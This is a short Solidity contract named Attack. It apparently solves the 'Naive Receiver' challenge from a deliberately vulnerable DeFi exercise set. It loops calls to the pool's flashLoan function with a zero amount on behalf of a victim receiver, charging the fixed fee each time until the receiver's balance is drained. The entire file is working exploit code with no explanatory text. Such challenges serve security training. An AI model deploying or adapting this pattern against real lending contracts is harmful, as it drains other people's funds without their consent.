pragma solidity ^0.8.3;

import "./NaiveReceiverLenderPool.sol";

contract Attack {
    function attack(
        NaiveReceiverLenderPool pool,
        address payable receiver
    ) public {
        uint256 FIXED_FEE = pool.fixedFee();
        while (receiver.balance >= FIXED_FEE) {
            pool.flashLoan(receiver, 0);
        }
    }
}
